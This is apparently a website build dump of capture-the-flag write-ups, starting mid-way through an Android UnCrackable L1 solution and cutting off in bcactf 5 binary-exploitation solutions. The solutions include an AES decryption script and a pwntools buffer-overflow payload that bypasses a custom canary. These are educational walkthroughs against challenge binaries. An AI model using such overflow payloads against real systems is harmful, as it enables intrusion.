\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            bArr[i \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">/\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) ((\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">Character\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">digit\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">charAt\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">i\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 16\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> &#x3C;&#x3C;\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 4\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> Character\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">digit\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">charAt\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">i \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 16\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> bArr;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"java\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> class\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#FFCB8B\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> static\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\">bArr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> byte\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[] \u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\">bArr2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        SecretKeySpec\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> secretKeySpec\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> SecretKeySpec\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">bArr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">AES/ECB/PKCS7Padding\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        Cipher\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> cipher\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> Cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getInstance\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">AES\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">init\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> secretKeySpec\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">doFinal\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">bArr2\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Wow. Lot to unpack here. But the gist of this is that the program will try to decrypt this hardcoded ciphertext with a hardcoded key which we know because of the AES error. We can also deduce that the AES used is ECB due to the other a object in a different file found.\u003C/p>\n\u003Cp>Let’s write a solve script that will decrypt the ciphertext with the hardcoded key we found.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> base64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> binascii\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">ciphertext_base64 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">key_hex \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">8d127684cbc37c17616d806cf50473cc\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">key_hash \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> binascii\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">unhexlify\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key_hex\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">ciphertext_bytes \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> base64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">b64decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">ciphertext_base64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">new\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key_hash\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> AES.MODE_ECB\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">decrypted \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decrypt\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">ciphertext_bytes\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">decrypted.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">utf-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We get our password: \u003Ccode>I want to believe\u003C/code>. We can check this by emulating the android application.\u003C/p>\n\u003Cp>\u003Cimg src=\"/img/writeups/2024/android-suite/OWASP_level1.png\" alt=\"Image of exploit success\">\u003C/p>\n\u003Ch2 id=\"picoctf\">picoCTF\u003C/h2>\n\u003Ch4 id=\"droids-3\">droids 3\u003C/h4>",{"headings":24,"imagePaths":43,"frontmatter":11},[25,29,33,37,40],{"depth":26,"slug":27,"text":28},1,"background-information","Background Information",{"depth":30,"slug":31,"text":32},2,"owasp","OWASP",{"depth":34,"slug":35,"text":36},4,"android-uncrackable-l1","Android UnCrackable L1",{"depth":30,"slug":38,"text":39},"picoctf","picoCTF",{"depth":34,"slug":41,"text":42},"droids-3","droids 3",[],"bcactf-5",{"id":44,"data":46,"body":53,"filePath":54,"digest":55,"rendered":56},{"author":12,"pubDatetime":47,"modDatetime":48,"title":49,"tags":50,"description":52},["Date","2024-06-23T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"bcactf 5 2024",[51],"writeup","Here is the solutions to some of the challenges in bcactf 5","\n# Background Information\nI went to this competition as BT Lazy Bums, we did a lot worse than we expected but what could we do? I got lazy so I'm just gonna post the pwn challenges I did.\n\n## Binary Exploitation\n\n### Inaccessable\n> I wrote a function to generate the flag, but don't worry, I bet you can't access it!\nThis felt more like a reverse engineering challenge, but the solve is simple.\n\nLoad up gdb and do `info functions`\n\n```bash\n0x0000000000400536  c\n0x0000000000400599  f\n0x00000000004005ea  win\n0x00000000004006b8  main\n```\n\nSo we have a win function. And the hint said to just jump to it. Ok.\n\n```bash\ngef➤  jump win\nContinuing at 0x4005ee.\nbcactf{W0w_Y0u_m4d3_iT_b810c453a9ac9}\n[Inferior 1 (process 39665) exited with code 046]\n```\n\n\n### canary keeper\n> My friend gave me this executable, but it keeps giving me errors. Can you get the flag?\n\nBased on the title, the solution for this problem is to bypass the \"canary\", which is basically an alarm that will close a program once it detects a buffer overflow.\n\nLet's look at the code:\n\n(binary ninja)\n```c\n\nint32_t main(int32_t argc, char** argv, char** envp)\n{\n    int64_t var_48;\n    __builtin_strncpy(&var_48, \"FLAG\", 0x40);\n    int32_t var_4f;\n    __builtin_strncpy(&var_4f, \"canary\", 7);\n    printf(\"Enter a string: \");\n    void buf;\n    gets(&buf);\n    int32_t rax_3;\n    if (check_canary(&var_4f) == 0)\n    {\n        puts(\"Buffer overflow detected!\");\n        rax_3 = 1;\n    }\n    else if (check_flag(&var_48) == 0)\n    {\n        printf(\"Flag: %s\\n\", \"FLAG\");\n        rax_3 = 0;\n    }\n    else\n    {\n        puts(\"No changes in flag detected!\");\n        rax_3 = 1;\n    }\n    return rax_3;\n}\n\n```\n\nSo as we can see that the input size is 73, and that there is a custom canary coded. What we can do with this is to overflow the binary, but append the canary so that it passes the check.\n\nHere's our tactic: \n\n1. Input 73 A's and append the binary string \"canary\" \n2. Add a four character anything. I'll just use flag\n3. Get the flag.\n\nUnfortunately I didn't realize that you had to use null bytes in order to allow the canary to bypas the check with data after it. Two days to realize that.\n\nSo here's the solve script:\n\n```python\nfrom pwn import *\nfrom pwn import p64\nelf = ELF('./provided')\n\n\n#its 73 space in the input(?)\n\nif args.REMOTE:\n    r = remote('challs.bcactf.com', 32101)\nelse:\n    r = process(elf.path)\n\n\npayload = b'A' * (73)\n#does the canary check(?)\npayload += b'canary'\npayload += b'\\x00'\npayload += b'flag'\n\n#payload += p64(0x63616e617279)\n\nprint(payload)\nr.sendline(payload)\nprint(r.recvall())\n\n```\n\nAnd we get the flag.\n\n```bash\n[*] '/home/jake/bcactf/canary/provided'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[+] Opening connection to challs.bcactf.com on port 32101: Done\nb'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcanary\\x00flag'\n[+] Receiving all data: Done (58B)\n[*] Closed connection to challs.bcactf.com port 32101\nb'Enter a string: Flag: bcactf{s1mple_CANaRY_9b36bd9f3fd2f}\\n'\njake@edgygamer:~/bcactf/canary$ \n```\n\n### pwnage\n> It's either a bug, a hack, an exploit, or it's pwnage. Let this challenge stand as one of the first of many stairs to mastery over that which can only be described as pwn.\n\nLet's look at the source code provided. \n\n```c\n\nint main() {\n    // Hint: how do these values get stored?\n    void* first_var;\n    char* guess;\n    char flag[100];\n    load_flag(flag, 100);\n\n    puts(\"Welcome to the most tasmastic game of all time!\");\n    wait_for(3);\n    puts(\"Basically it's just too simple, I've put the\");\n    puts(\"flag into the memory and your job is ... to\");\n    puts(\"guess where it is!!\");\n    wait_for(2);\n    puts(\"Have fun!\");\n    wait_for(1);\n    puts(\"Oh and before you start, I'll give you a little\");\n    puts(\"hint, the address of the current stackframe I'm\");\n    printf(\"in is %p\\n\", (&first_var)[-2]);\n    wait_for(3);\n    puts(\"Okay anyway, back to the game. Make your guess!\");\n    puts(\"(hexadecimals only, so something like 0xA would work)\");\n    printf(\"guess> \");\n\n    guess = read_pointer();\n\n    wait_for(3);\n\n    puts(\"Okay, prepare yourself. If you're right this\");\n    puts(\"will print out the flag\");\n    \n    wait_for(1);\n    puts(\"Oh, and if your wrong, this might crash and\");\n    puts(\"disconnect you\\nGood luck!\");\n\n    printf(\"%s\\n\", guess);\n\n    return 1;\n}\n```\n\nOk, so it prints out the current stack frame of first_var. It then asks for a guess in hexadecimal format, which is a guess for the stack frame of the flag.\n\nWe can look at this part specifically:\n\n```c\nvoid* first_var;\nchar* guess;\nchar flag[100];\nload_flag(flag, 100);\n```\n\nSo all we need to do is \"shift\" upwards by adding bytes to the stackframe. Simple. I kind of guessed the offset, but it seems to be 0x20 from the provided stackframe.\n\n```bash\nWelcome to the most tasmastic game of all time!\n . . .\nBasically it's just too simple, I've put the\nflag into the memory and your job is ... to\nguess where it is!!\n . .\nHow fun is that!\n .\nOh and before you start, I'll give you a little\nhint, the address of the current stackframe I'm\nin is 0x7ffeb79507b0\n . . .\nOkay anyway, back to the game. Make your guess!\n(hexadecimals only, so something like 0xA would work)\nguess> 0x7ffeb79507d0\n . . .\nOkay, prepare yourself. If you're right this\nwill print out the flag\n .\nOh, and if your wrong, this might crash and\ndisconnect you\nGood luck!\nbcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}\n```\n\n","src/content/blog/bcactf-5.md","ac0bc5eccb496370",{"html":57,"metadata":58},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>I went to this competition as BT Lazy Bums, we did a lot worse than we expected but what could we do? I got lazy so I’m just gonna post the pwn challenges I did.\u003C/p>\n\u003Ch2 id=\"binary-exploitation\">Binary Exploitation\u003C/h2>\n\u003Ch3 id=\"inaccessable\">Inaccessable\u003C/h3>\n\u003Cblockquote>\n\u003Cp>I wrote a function to generate the flag, but don’t worry, I bet you can’t access it!\nThis felt more like a reverse engineering challenge, but the solve is simple.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Load up gdb and do \u003Ccode>info functions\u003C/code>\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">0x0000000000400536\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">  c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">0x0000000000400599\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">  f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">0x00000000004005ea\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">  win\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">0x00000000004006b8\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">  main\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So we have a win function. And the hint said to just jump to it. Ok.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">gef➤\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">  jump\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> win\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Continuing\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> at\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> 0x4005ee.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">bcactf\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">{W0w_Y0u_m4d3_iT_b810c453a9ac9}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[Inferior \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan 